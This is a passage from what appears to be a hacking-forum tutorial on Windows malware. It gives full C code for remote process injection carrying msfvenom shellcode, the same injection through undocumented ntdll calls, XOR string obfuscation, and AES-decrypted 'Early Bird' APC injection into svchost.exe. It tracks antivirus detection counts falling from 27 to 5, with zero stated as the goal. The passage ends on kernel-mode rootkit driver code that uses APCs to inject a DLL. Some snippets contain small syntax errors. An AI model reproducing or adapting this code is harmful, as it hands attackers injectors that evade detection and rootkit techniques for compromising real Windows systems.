    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    
(!CreateProcessW(
        L"C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        BELOW_NORMAL_PRIORITY_CLASS,
        NULL,
        NULL,
        &amp;si,
        &amp;pi
));
  
  char shellcode[] ={
  };

    HANDLE hProcess; 
    HANDLE hThread;
    void*exec_mem;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS,TRUE,pi.dwProcessId);
    exec_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, exec_mem, shellcode, sizeof(shellcode), NULL);
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL,0,0);
    CloseHandle(hProcess);
    return 0;
}
</code></pre>
<p>Alright, do you notice any differences? Bingo, there’s “shellcode.” Let me clarify; the initial code segment was straightforward, mainly focusing on creating a new process (Notepad) and adjusting its priority class. However, the code we’re dealing with now is more sinister, as it centers around remote process injection and the implementation of functions such as <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code> to allocate memory within a target process and execute custom shellcode within it.</p>
<p>Nevertheless, plaintext Metasploit (msf) shellcode tends to raise red flags and is susceptible to detection by antivirus engines. In the preceding section, we delved into shellcode development, particularly emphasizing a reverse shell. Yet, this code is simpler and can be swiftly pinpointed by antivirus engines. So, let’s explore an alternative strategy how about encoding the shellcode into Read-Write-Execute (RWX) memory to initiate Notepad?</p>
<p>Alright, RWX memory implementation is fairly straightforward for our intended purpose. It involves searching a process’s private virtual memory space (the userland virtual memory space) for a memory section marked as <em>PAGE_EXECUTE_READWRITE</em>. If such a space is found, it’s returned. If not, the next search address is adjusted to the subsequent memory region (<em>BaseAddress</em> + <em>Memory Region</em>).</p>
<p>To finalize this for code execution, our shellcode must then be relocated to that discovered memory region and executed. An efficient way to achieve this is to resort  WinAPI calls, similar to what we demonstrated in the first technique. However, it’s essential to consider the drawbacks of that approach, as discussed above.</p>
<pre><code class="lang-c">int main(int argc, char * argv[])  
{  
    // msfvenom -p windows/x64/exec CMD=notepad.exe -f c  
    unsigned char shellcode[] =  
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";
        
    int newPid = atoi(argv[1]);  
    printf("Injecting into pid %d\n", newPid);  
  
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD)newPid);  
    if (!pHandle)  
    {  
        printf("Invalid Handle\n");  
        exit(1);  
    }  
    LPVOID remoteBuf = VirtualAllocEx(pHandle, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
    if (!remoteBuf)  
    {  
        printf("Alloc Fail\n");  
        exit(1);  
    }  
    printf("alloc addr: %p\n", remoteBuf);  
    WriteProcessMemory(pHandle, remoteBuf, shellcode, sizeof(shellcode), NULL);  
    CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);  
    return 0;  
}
</code></pre>
<p>Let’s  try to move away from them and directly use the undocumented functions within <code>ntdll.dll</code> in this one we go level lower where we do the syscalls directly.</p>
<p>We need:</p>
<ul>
<li>NtAllocateVirtualMemory</li>
<li>NtWriteVirtualMemory</li>
<li>NtCreateThreadEx</li>
</ul>
<p>Since these APIs are not documented by Microsoft, we need to find some external references made by reverse engineers. <a href="http://undocumented.ntinternals.net/" rel="noopener nofollow ugc">http://undocumented.ntinternals.net/</a></p>
<p>Let’s look at the definition of an <code>NTAPI</code> function from the reference link:</p>
<pre><code class="lang-auto">NTSYSAPI   
NTSTATUS  
NTAPI  
  
NtAllocateVirtualMemory(  
  
  
  IN HANDLE               ProcessHandle,  
  IN OUT PVOID            *BaseAddress,  
  IN ULONG                ZeroBits,  
  IN OUT PULONG           RegionSize,  
  IN ULONG                AllocationType,  
  IN ULONG                Protect );
</code></pre>
<p><code>NTSTATUS</code> is the actual return value, while <code>NTSYSAPI</code> marks the function as a library import and <code>NTAPI</code> defines the windows api calling convention.</p>
<p><code>IN</code> means the function requires it as input, while <code>OUT</code> means that the parameter passed in is modified with some return output.</p>
<p>When we prototype the functions, we just need to note the <code>NTAPI</code> part.<br>
In fact you can also use <code>WINAPI</code> since the both of them resolve to <code>__stdcall</code>.</p>
<pre><code class="lang-c">typedef NTSTATUS(NTAPI* NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);  
typedef NTSTATUS(NTAPI* NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);  
typedef NTSTATUS(NTAPI* NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);
</code></pre>
<p>Here we prototype some function pointers that we’ll map the address of the actual functions in <code>ntdll.dll</code> to later.</p>
<p>You might notice that some types are also missing, for example the <code>POBJECT_ATTRIBUTES</code>, so let’s find and define them from the references.</p>
<pre><code class="lang-c">typedef struct _UNICODE_STRING {  
    USHORT Length;  
    USHORT MaximumLength;  
    PWSTR  Buffer;  
} UNICODE_STRING, *PUNICODE_STRING;  
  
typedef struct _OBJECT_ATTRIBUTES {  
    ULONG           Length;  
    HANDLE          RootDirectory;  
    PUNICODE_STRING ObjectName;  
    ULONG           Attributes;  
    PVOID           SecurityDescriptor;  
    PVOID           SecurityQualityOfService;  
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;  
  
typedef struct _PS_ATTRIBUTE {  
    ULONG Attribute;  
    SIZE_T Size;  
    union {  
        ULONG Value;  
        PVOID ValuePtr;  
    } u1;  
    PSIZE_T ReturnLength;  
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;  
  
typedef struct _PS_ATTRIBUTE_LIST  
{  
    SIZE_T       TotalLength;  
    PS_ATTRIBUTE Attributes[1];  
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
</code></pre>
<p>Now Let’s load <code>ntdll.dll</code> and map the functions.</p>
<pre><code class="lang-c">HINSTANCE hNtdll = LoadLibraryW(L"ntdll.dll");  
if (!hNtdll)  
{  
    printf("Load ntdll fail\n");  
    exit(1);  
}  
  
NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");  
NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, "NtWriteVirtualMemory");  
NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, "NtCreateThreadEx");
</code></pre>
<p>Finally we can call these functions.</p>
<pre><code class="lang-c">typedef NTSTATUS(NTAPI* NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);  
typedef NTSTATUS(NTAPI* NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);  
typedef NTSTATUS(NTAPI* NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);  
  
int main(int argc, char * argv[])  
{  
    // msfvenom -p windows/x64/exec CMD=notepad.exe -f c  
    unsigned char shellcode[] =  
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";
     
	int newPid = atoi(argv[1]);  
	printf("Injecting into pid %d\n", newPid);  
  
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD)newPid);  
    if (!pHandle)  
    {  
        printf("Invalid Handle\n");  
        exit(1);  
    }  
    HANDLE tHandle;  
    HINSTANCE hNtdll = LoadLibraryW(L"ntdll.dll");  
    if (!hNtdll)  
    {  
        printf("Load ntdll fail\n");  
        exit(1);  
    }  
  
    NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");  
    NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, "NtWriteVirtualMemory");  
    NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, "NtCreateThreadEx");  
    void * allocAddr = NULL;  
    SIZE_T allocSize = sizeof(shellcode);  
    NTSTATUS status;  
    status = NtAllocateVirtualMemory(pHandle, &amp;allocAddr, 0, (PULONG)&amp;allocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);  
    printf("status alloc: %X\n", status);  
    printf("alloc addr: %p\n", allocAddr);  
    status = NtWriteVirtualMemory(pHandle, allocAddr, shellcode, sizeof(shellcode), NULL);  
    printf("status write: %X\n", status);  
    status = NtCreateThreadEx(&amp;tHandle, GENERIC_EXECUTE, NULL, pHandle, allocAddr, NULL, 0, 0, 0, 0, NULL);  
    printf("status exec: %X\n", status);  
  
	return 0;  
}
</code></pre>
<p>So, if you decide to upload this to antivirus engines (which I don’t recommend, but the choice is yours), what can you expect? Well, you might see 27 out of 72 detections triggering alarms left and right, screaming ‘MALICIOUS!’ It’s as if the antivirus engines are having a celebration. But here’s the real challenge: we’re striving for a complete absence of detections. We’re not looking for a party, we’re after more stealthy.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8.png" data-download-href="/uploads/short-url/wGhxEciBeqiwVyYKqZTzj2xU4lO.png?dl=1" title="AAA" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8_2_690x189.png" alt="AAA" data-base62-sha1="wGhxEciBeqiwVyYKqZTzj2xU4lO" width="690" height="189" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8_2_690x189.png, https://0x00sec.s3.amazonaws.com/original/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8.png 2x" data-dominant-color="F9F7F7"></a></div><p></p>
<p>Like I said msf shellcode is a give away but let’s Try something else.  Time to dust off some classic techniques that never go out of style. We’re diving into XOR encryption, a method you’re probably familiar with when it comes to encrypting shellcode. When XOR encryption is put to work on shellcode, a key is carefully selected to XOR every byte of the shellcode. To decrypt the shellcode, you simply employ the same key to XOR each byte once more, effectively reversing the encryption process and restoring the original shellcode. However, it’s worth noting that XOR encryption can be a walk in the park for attackers who know the key. If you’re up for a challenge, check out the one I posted a while back <a href="https://0x00sec.org/t/reverseme-cipher/35518">ReverseMeCipher</a> which involves XOR encryption. Here’s a writeup to give you some insights <a href="https://0xf00i.github.io/2023/06/12/ReverseMe-Writeup.html" rel="noopener nofollow ugc">CipherWriteup</a> As a general rule, it’s often smarter to combine XOR encryption with other methods.</p>
<p>So first we wanna remove strings and debug symbols,  Running the command <code>strings</code> on our exe reveals strings such as “NtCreateThreadEx”, which may lead to AV detection.</p>
<p>We can remove these strings by again XOR encrypting them and decrypting during runtime, First we start by the function responsible for encryption and decryption</p>
<pre><code class="lang-c">unsigned char * rox(unsigned char *, int, int);
unsigned char * rox(unsigned char * data, int dataLen, int xor_key)
{
    unsigned char * output = (unsigned char *)malloc(sizeof(unsigned char) * dataLen + 1);

    for (int i = 0; i &lt; dataLen; i++)
        output[i] = data[i] ^ xor_key;

    return output;
}
</code></pre>
<p>This Function can be used for encryption and also be used for decryption by applying the same XOR operation. If you XOR the encrypted data with the same <code>xor_key</code>, it will revert to the original data, just formats encrypted shellcode nicely so we can copy and paste, and we only need the encrypt function in our actual injector.</p>
<pre><code class="lang-c">const char* ntdll_str = (const char*)ntdll;
const char* navm_str = (const char*)navm;
const char* nwvm_str = (const char*)nwvm;
const char* ncte_str = (const char*)ncte;
</code></pre>
<p>So like we said NtCreateThreadEx." These strings can be indicative of the program’s functionality and may lead to antivirus (AV), One way to obfuscate these strings and make them less detectable is to XOR encrypt them, and then decrypt them during runtime when they are needed.</p>
<p>For example:</p>
<pre><code class="lang-c">unsigned char ntdll_data[] = {0x3d, 0x27, 0x37, 0x3f, 0x3f, 0x7d, 0x37, 0x3f, 0x3f, 0x53};
unsigned char *ntdll = rox(ntdll_data, 10, 0x53);
</code></pre>
<p>Let’s use <a href="https://www.virustotal.com/" rel="noopener nofollow ugc">Virustotal</a> again and check the detection rate.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf085c44554465665747437a6dd927da65f13969.png" data-download-href="/uploads/short-url/txuKpdmUR8SvwXRgZT5T5uYfxj3.png?dl=1" title="BBB" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cf085c44554465665747437a6dd927da65f13969_2_690x179.png" alt="BBB" data-base62-sha1="txuKpdmUR8SvwXRgZT5T5uYfxj3" width="690" height="179" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cf085c44554465665747437a6dd927da65f13969_2_690x179.png, https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf085c44554465665747437a6dd927da65f13969.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf085c44554465665747437a6dd927da65f13969.png 2x" data-dominant-color="F9F7F8"></a></div><p></p>
<p>Well, going from 27 detections down to 9 is indeed a notable improvement, but it’s essential to recognize that this level of evasion is still relatively basic, especially when relying on tools like <code>msfvenom</code> to achieve our goals.</p>
<p>Alright time for a new code Injection Technique “Early Bird” This Was used by group goes by APT33 How this works Simply it takes advantage of the application threading process that happens when a program executes on a computer. In other words, attackers inject malware code into legitimate process threads in an effort to hide malicious code inside commonly seen and legitimate processes.</p>
<p>We gone use functions like <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>QueueUserAPC</code>, <code>CreateProcessW</code>, and <code>ResumeThread</code> By this time Before injecting the shellcode we  a employs an AES decryption routine, The decryption process uses the Cryptography API (CryptAcquireContextW) functions to decrypt the payload using a predefined key.</p>
<pre><code class="lang-c">int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keylen) {

HCRYPTPROV hProv;
HCRYPTHASH hHash;
HCRYPTKEY hKey;

BOOL CryptAcquire = CryptAcquireContextW(&amp;hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
if (CryptAcquire == false) {
//printf("CryptAcquireContextW Failed: %d\n", GetLastError());
return -1;
}

BOOL CryptCreate = CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &amp;hHash);
if (CryptCreate == false) {
//printf("CryptCreateHash Failed: %d\n", GetLastError());
return -1;
}

  
BOOL CryptHash = CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
if (CryptHash == false) {
//printf("CryptHashData Failed: %d\n", GetLastError());
return -1;
}

  

BOOL CryptDerive = CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &amp;hKey);
if (CryptDerive == false) {
//printf("CryptDeriveKey Failed: %d\n", GetLastError());
return -1;
}

  

BOOL Crypt_Decrypt = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &amp;payload_len);
if (Crypt_Decrypt == false) {
//printf("CryptDecrypt Failed: %d\n", GetLastError());
return -1;
}

  

CryptReleaseContext(hProv, 0);
CryptDestroyHash(hHash);
CryptDestroyKey(hKey);

return 0;
}
</code></pre>
<p>The AES decryption routine ensures that the injected shellcode is in its original, unencrypted form, which is essential for executing it within the target process. This decryption process allows attackers to conceal the true nature of their payload until it is actively executed in the target process’s thread.</p>
<p>Next <code>CreateProcessW</code></p>
<pre><code class="lang-c">pfnCreateProcessW pCreateProcessW = (pfnCreateProcessW)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateProcessW");
if (pCreateProcessW == NULL) {
    // Handle error if the function cannot be found
}

STARTUPINFOW si;
PROCESS_INFORMATION pi;

// Clear out startup and process info structures
RtlSecureZeroMemory(&amp;si, sizeof(si));
si.cb = sizeof(si;
RtlSecureZeroMemory(&amp;pi, sizeof(pi));

std::wstring pName = L"C:\\Windows\\System32\\svchost.exe";

HANDLE pHandle = NULL;
HANDLE hThread = NULL;
DWORD Pid = 0;

BOOL cProcess = pCreateProcessW(NULL, &amp;pName[0], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);

</code></pre>
<p>The <code>CreateProcessW</code> function is invoked to create a new process, which, in this case, is intended to execute the <code>svchost.exe</code> application. However, a critical parameter here is <code>CREATE_SUSPENDED</code>, which is set to <code>TRUE</code>, After successfully creating the suspended process, the code retrieves the process and thread handles. These handles are crucial for further manipulation of the newly created process.</p>
<pre><code class="lang-auto">pHandle = pi.hProcess;
hThread = pi.hThread;
Pid = pi.dwProcessId;
</code></pre>
<p>With the suspended process and its associated handles in place, now we ready to proceed with the code injection, which involves injecting shellcode into the memory space of the newly created process.</p>
<p>Creating a suspended process provides an ideal opportunity to inject code and manipulate the process without raising immediate suspicion.</p>
<p>In the next steps, we will proceed to inject the shellcode into the suspended process, ultimately leading to its execution within the context of the target process’s thread, However Before injecting the shellcode, memory space is allocated within the target process to accommodate the injected code. This allocation is done using the <code>VirtualAllocEx</code> function.</p>
<pre><code class="lang-c">LPVOID memAlloc = pVirtualAllocEx(pHandle, 0, scSize, MEM_COMMIT, PAGE_EXECUTE_READ);
</code></pre>
<p>The shellcode, which was previously decrypted, is now written into the allocated memory space within the target process using the <code>WriteProcessMemory</code> function.</p>
<pre><code class="lang-cpp">DWORD wMem = pWriteProcessMemory(pHandle, (LPVOID)memAlloc, shellcode, scSize, &amp;bytesWritten);
</code></pre>
<p>With the shellcode successfully injected into the target process’s memory, the code prepares for its execution. This is done using the <code>QueueUserAPC</code> function, which enqueues the shellcode for execution within the context of a specific thread within the target process.</p>
<pre><code class="lang-c">if (pQueueUserAPC((PAPCFUNC)memAlloc, hThread, NULL)) {
    pResumeThread(hThread);
}
</code></pre>
<p>Now, let’s verify the success of our concealment strategy by injecting the shellcode into a suspended process and manipulating the memory space within the context of the process’s thread.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849.png" data-download-href="/uploads/short-url/fCUP6PNVSZF5U2KAGq0ym7rxtmV.png?dl=1" title="CCC" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849_2_690x169.png" alt="CCC" data-base62-sha1="fCUP6PNVSZF5U2KAGq0ym7rxtmV" width="690" height="169" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849_2_690x169.png, https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849.png 2x" data-dominant-color="F8F7F7"></a></div><p></p>
<p>Among the initial 72 detections, we’ve successfully narrowed it down to a mere 5. We commenced with 27 detections, which subsequently decreased to 9, and now we find ourselves with just 5 remaining, and we can keep it going and I’m pretty sure we hit that big zero, This overarching perspective emphasizes the importance of having a diverse array of techniques in your arsenal.</p>
<h1><a name="writing-a-simple-rootkit-22" class="anchor" href="https://0x00sec.org#writing-a-simple-rootkit-22"></a>Writing a simple Rootkit</h1>
<p>Kernel mode rootkits operate at the most privileged level, known as “Ring 0,” in the computer’s architecture. In contrast, user mode rootkits run at “Ring 3,” which is a lower privilege level.</p>
<p>In order to grasp the workings of kernel mode rootkits, it is essential to have a solid grasp of the basics of Windows device drivers. Essentially, a device driver is a software component responsible for interfacing with hardware and managing Input/Output Request Packets (IRPs).</p>
<h3><a name="writing-a-windows-device-driver-23" class="anchor" href="https://0x00sec.org#writing-a-windows-device-driver-23"></a>Writing a Windows Device Driver</h3>
<p>Let’s start by building a basic Windows device driver:</p>
<pre><code class="lang-c">#include "ntddk.h"

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    DbgPrint("Hello World!");
    return STATUS_SUCCESS;
}

</code></pre>
<p>This simple driver initializes and prints “Hello World!” to the kernel debugger. However, to perform more complex tasks, we need to understand IRPs.</p>
<h2><a name="understanding-io-request-packets-irps-24" class="anchor" href="https://0x00sec.org#understanding-io-request-packets-irps-24"></a>Understanding I/O Request Packets (IRPs)</h2>
<p>IRPs are data structures used to communicate between user-mode programs and kernel-mode drivers. When a user-mode program, for example, writes data to a file handle, the kernel creates an IRP to manage this operation.</p>
<p>To process IRPs effectively, a driver must define functions for handling them. In the provided code, we set up a basic dispatch function that completes the IRP with a success status. In reality, different functions would handle various IRP types.</p>
<pre><code class="lang-c">NTSTATUS OnStubDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    Irp-&gt;IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}
</code></pre>
<p>The driver sets up major function pointers, such as <code>IRP_MJ_CREATE</code>, <code>IRP_MJ_CLOSE</code>, <code>IRP_MJ_READ</code>, <code>IRP_MJ_WRITE</code>, and <code>IRP_MJ_DEVICE_CONTROL</code>, to handle specific IRP types. In a comprehensive driver, separate functions would handle these major functions.</p>
<h2><a name="creating-a-file-handle-25" class="anchor" href="https://0x00sec.org#creating-a-file-handle-25"></a>Creating a File Handle</h2>
<p>File handles are essential for user-mode programs to interact with kernel drivers. In Windows, to use a kernel driver from user-mode, the user-mode program must open a file handle to the driver. The driver first registers a named device, and then the user-mode program opens it as if it were a file.</p>
<pre><code class="lang-c">const WCHAR deviceNameBuffer[] = L"\\Device\\MyDevice";
PDEVICE_OBJECT g_RootkitDevice; // Global pointer to our device object

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    NTSTATUS ntStatus;
    UNICODE_STRING deviceNameUnicodeString;

    RtlInitUnicodeString(&amp;deviceNameUnicodeString, deviceNameBuffer);

    ntStatus = IoCreateDevice(DriverObject, 0, &amp;deviceNameUnicodeString, 0x00001234, 0, TRUE, &amp;g_RootkitDevice);
    // ...
}

</code></pre>
<p>This code registers a device named “MyDevice.” A user-mode program can open this device using a fully qualified path, e.g., <code>\\\\Device\\MyDevice</code>. This file handle can be used with functions like <code>ReadFile</code> and <code>WriteFile</code>, which generate IRPs for communication.</p>
<p>Understanding the interaction between user-mode and kernel-mode via IRPs and file handles is fundamental to writing effective Windows device drivers, an essential concept in the realm of kernel mode rootkits.</p>
<p>Remember <strong>DLL Injection</strong>? Now, let’s take a look at how it’s employed by rootkits to inject malicious code or custom device drivers directly into the Windows kernel. In the context of the previously discussed device driver and rootkit concepts, we can explore how kernel-mode DLL injection fits into the picture:</p>
<h3><a name="kernel-mode-dll-26" class="anchor" href="https://0x00sec.org#kernel-mode-dll-26"></a>Kernel-Mode DLL</h3>
<p>The process typically begins with the <code>DriverEntry</code> function, which is the entry point for our driver. Here’s how we start:</p>
<pre><code class="lang-c">NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverobject, IN PUNICODE_STRING pRegister)
{

NTSTATUS st;
  
PsSetLoadImageNotifyRoutine(&amp;LoadImageNotifyRoutine);

pDriverobject-&gt;DriverUnload = (PDRIVER_UNLOAD)Unload;
  
return STATUS_SUCCESS;
}
</code></pre>
<p>In this code snippet, we employ the <code>PsSetLoadImageNotifyRoutine</code> function to register an image load notification routine. This step is crucial as it allows us to monitor the loading of specific system DLLs, such as <code>kernel32.dll</code>, into the kernel’s address space.</p>
<p>Additionally, we set the driver’s unload function (<code>pDriverobject-&gt;DriverUnload</code>) to handle cleanup operations when the driver is unloaded. This ensures that any resources or callbacks registered during the driver’s lifetime are properly managed.</p>
<h3><a name="image-load-notification-27" class="anchor" href="https://0x00sec.org#image-load-notification-27"></a>Image Load Notification</h3>
<p>Our monitoring process hinges on image load notifications. We need to identify when the system loads <code>kernel32.dll</code>, a fundamental DLL for Windows operating systems. The <code>LoadImageNotifyRoutine</code> function enables this monitoring.</p>
<pre><code class="lang-c">VOID LoadImageNotifyRoutine(IN PUNICODE_STRING ImageName, IN HANDLE ProcessId, IN PIMAGE_INFO pImageInfo)
{
    if (ImageName != NULL)
    {
        // Check if the loaded image matches the name of kernel32.dll
        WCHAR kernel32Mask[] = L"*\\KERNEL32.DLL";
        UNICODE_STRING kernel32us;
        RtlInitUnicodeString(&amp;kernel32us, kernel32Mask);

        if (FsRtlIsNameInExpression(&amp;kernel32us, ImageName, TRUE, NULL))
        {
            PKAPC Apc;
            
            if (Hash.Kernel32dll == 0)
            {
                // Initialize the Hash structure and import the function addresses
                Hash.Kernel32dll = (PVOID)pImageInfo-&gt;ImageBase;
                Hash.pvLoadLibraryExA = (fnLoadLibraryExA)ResolveDynamicImport(Hash.Kernel32dll, SIRIFEF_LOADLIBRARYEXA_ADDRESS);
            }

            // Create an Asynchronous Procedure Call (APC) to initiate DLL injection
            Apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
            if (Apc)
            {
                KeInitializeApc(Apc, KeGetCurrentThread(), 0, (PKKERNEL_ROUTINE)APCInjectorRoutine, 0, 0, KernelMode, 0);
                KeInsertQueueApc(Apc, 0, 0, IO_NO_INCREMENT);
            }
        }
    }
    return;
}

</code></pre>
<p>The <code>LoadImageNotifyRoutine</code> function plays a pivotal role in our DLL injection process. It checks if the <code>ImageName</code> parameter is not NULL, ensuring that we are actively monitoring loaded images with names. Furthermore, we examine if the loaded image matches the name of <code>kernel32.dll</code>.</p>
<p>If a match is found, we proceed with initializing the <code>Hash</code> structure and creating an Asynchronous Procedure Call (APC) using the <code>APCInjectorRoutine</code>. The APC serves as a mechanism to trigger the DLL injection process into a target process.</p>
